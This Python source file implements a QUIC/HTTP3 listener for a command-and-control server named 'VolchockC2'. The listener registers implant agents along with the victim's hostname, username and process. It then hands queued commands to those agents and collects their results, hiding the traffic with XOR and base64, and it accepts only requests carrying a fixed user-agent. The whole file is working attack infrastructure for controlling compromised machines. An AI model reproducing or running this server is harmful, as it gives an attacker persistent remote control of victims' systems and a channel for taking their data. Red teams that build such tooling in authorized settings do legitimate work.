import asyncio
import json
import os
import time
import threading
from aioquic.asyncio import serve
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.events import HeadersReceived, DataReceived

from .base_listener import BaseListener
from teamserver.encryption.xor_util import XORCipher

class QuicH3Protocol(QuicConnectionProtocol):
    def __init__(self, *args, quic_listener=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.listener = quic_listener
        self._http = None
        self.stream_buffers = {}

    def quic_event_received(self, event):
        if self._http is None:
            self._http = H3Connection(self._quic)
        for http_event in self._http.handle_event(event):
            self.http_event_received(http_event)

    def connection_made(self, transport):
        super().connection_made(transport)

    def http_event_received(self, event):
        if isinstance(event, HeadersReceived):
            stream_id = event.stream_id
            self.stream_buffers[stream_id] = {"headers": event.headers, "body": b""}
        elif isinstance(event, DataReceived):
            stream_id = event.stream_id
            self.stream_buffers[stream_id]["body"] += event.data
            if event.stream_ended:
                asyncio.ensure_future(
                    self.listener.handle_request(
                        stream_id,
                        self.stream_buffers[stream_id]["headers"],
                        self.stream_buffers[stream_id]["body"],
                        self
                    )
                )

    def send_response(self, stream_id, status_code, headers, data):
        headers = [
            (b':status', str(status_code).encode()),
            (b'server', b'VolchockC2')
        ] + [(k if isinstance(k, bytes) else k.encode(), v if isinstance(v, bytes) else v.encode()) for k, v in headers]
        self._http.send_headers(stream_id=stream_id, headers=headers)
        self._http.send_data(stream_id=stream_id, data=data, end_stream=True)
        self.transmit()  # Important pour "pousser" la réponse au client


class QuicListener(BaseListener):
    def __init__(self, config, host="0.0.0.0", port=443, request_queue=None, agent_handler=None, xor_key=None, certfile=None, keyfile=None):
        super().__init__(config)
        self.host = host
        self.port = port
        self.request_queue = request_queue
        self.agent_handler = agent_handler
        self.certfile = certfile
        self.keyfile = keyfile

        if xor_key is None:
            raise ValueError("xor_key must be provided to QuicListener")
        self.xor_cipher = XORCipher(xor_key)

        self._running = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True)

        self.quic_config = QuicConfiguration(
            is_client=False,
            alpn_protocols=H3_ALPN,
        )
        self.quic_config.load_cert_chain(certfile, keyfile)

    async def handle_request(self, stream_id, headers, body, protocol):
        try:
            headers = {k.decode(): v.decode() for k, v in headers}
            method = headers.get(':method', 'GET')
            path = headers.get(':path', '/')
            content_length = int(headers.get("content-length", "0"))
            data = body.decode(errors='ignore') if body else ""
            body_json = json.loads(data) if (data and method in ["POST", "PUT"]) else {}

            expected_agent = self.config.get('user_agent')
            if expected_agent and headers.get("user-agent") != expected_agent:
                protocol.send_response(stream_id, 403, [], b"Invalid User-Agent")
                return

            if path.startswith("/agent/") and path.endswith("/push_result") and method.upper() == "POST":
                agent_id = path.split("/")[2]
                xor_result = body_json.get("result", "")
                try:
                    decoded_result = self.xor_cipher.decrypt_b64(xor_result)
                except Exception as exc:
                    protocol.send_response(
                        stream_id, 400, [],
                        json.dumps({"error": f"Failed to decode result: {exc}"}).encode()
                    )
                    return
                self.agent_handler.push_agent_result(agent_id, decoded_result)
                protocol.send_response(stream_id, 200, [], b'{"status":"result stored"}')
                return

            if path.startswith("/agent/") and path.endswith("/results") and method.upper() == "GET":
                agent_id = path.split("/")[2]
                results = self.agent_handler.pop_agent_results(agent_id)
                results_xor = [self.xor_cipher.encrypt_b64(res) for res in results]
                payload = json.dumps({"results": results_xor}).encode()
                protocol.send_response(stream_id, 200, [], payload)
                return

            agent_id = (
                body_json.get('agent_id')
                or headers.get("x-agent-id")
            )
            now = time.time()
            if agent_id:
                agent_fields = {
                    "last_seen": now,
                    "hostname": body_json.get("hostname"),
                    "ip": headers.get("x-real-ip") or "quic_agent",
                    "process_name": body_json.get("process_name"),
                    "username": body_json.get("username"),
                }
                if not self.agent_handler.get_agent(agent_id):
                    self.agent_handler.register_agent(agent_id, agent_fields)
                else:
                    self.agent_handler.update_agent(agent_id, agent_fields)

            if self.request_queue is not None:
                entry = {
                    "uri": path,
                    "headers": headers,
                    "method": method,
                    "time": now,
                    "remote_addr": headers.get("x-real-ip"),
                    "data": body_json
                }
                self.request_queue.put(entry)

            if agent_id:
                cmds = self.agent_handler.pop_commands(agent_id)
                cmds_xor = [self.xor_cipher.encrypt_b64(cmd) for cmd in cmds]
                protocol.send_response(
                    stream_id, 200, [],
                    json.dumps({"status":"OK", "tasks": cmds_xor}).encode()
                )
                return
            protocol.send_response(stream_id, 200, [], b'{"status":"OK"}')
        except Exception as exc:
            protocol.send_response(stream_id, 500, [], str(exc).encode())

    async def main(self):
        await serve(
            self.host,
            self.port,
            configuration=self.quic_config,
            create_protocol=lambda *args, **kwargs: QuicH3Protocol(*args, quic_listener=self, **kwargs)
        )

    def _run(self):
        self._running.set()
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(self.main())
            loop.run_forever()
        finally:
            loop.close()

    def start(self):
        self.thread.start()

    def stop(self):
        self._running.clear()

    def join(self):
        while self.thread.is_alive():
            time.sleep(1)
